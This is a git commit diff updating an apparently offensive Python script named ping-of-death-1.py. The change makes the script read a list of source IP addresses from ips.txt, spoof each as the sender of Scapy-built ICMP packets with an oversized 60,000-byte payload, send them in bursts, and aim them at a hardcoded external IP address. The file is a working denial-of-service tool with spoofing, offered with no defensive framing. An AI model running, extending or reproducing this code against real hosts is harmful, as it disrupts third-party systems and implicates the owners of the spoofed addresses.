72195c0a61c34771cc97dc3f770893cecb71760f
monikeo281000 <dark.moni.281000@gmail.com>
2025-01-24 02:28:30 +0700

    Update scripts/ping-of-death

--- scripts/ping-of-death/python/ping-of-death-1.py
+++ scripts/ping-of-death/python/ping-of-death-1.py
@@ -18,24 +18,44 @@ class Style:
 
 style = Style()
 
-def send_pod_attack(target_ip):
+def read_ips():
+    filename = "ips.txt"
+    try:
+        with open(filename, 'r') as file:
+            ips = [line.strip() for line in file if line.strip()]
+            return ips
+    except FileNotFoundError as e:
+        print(style.RED + f"[-]ERROR: {e}" + style.RESET)
+        sys.exit()
+
+def send_pod_attack(source_ip, target_ip):
     """
     Send fragmented ICMP packets to simulate Ping of Death (PoD).
     """
     try:
         # create an oversize paylaod
         # payload that larger than the maximum size
-        oversize_payload = b"A" * 70000
+        oversize_payload = b"A" * 60000
 
+        # construct the packets
+        ip_packet = IP(src=source_ip, dst=target_ip)
+        icmp_packet = ICMP()
+        fragmented_packets = ip_packet / icmp_packet / oversize_payload
+
+        # send the fragmented packets
+        send(5 * fragmented_packets, verbose = False)
         print(style.GREEN + f"Ping of death packets send to {target_ip}" + style.RESET)
-
     except Exception as e:
         print(style.RED + f"[-]ERROR: {e}" + style.RESET)
 
+def process(target_ip):
+    ips = read_ips()
+    for ip in ips:
+        send_pod_attack(ip, target_ip)
+
 def main():
     target_ip = "162.210.97.174"
-
-    send_pod_attack(target_ip)
+    process(target_ip)
     
 if __name__ == "__main__":
     main()
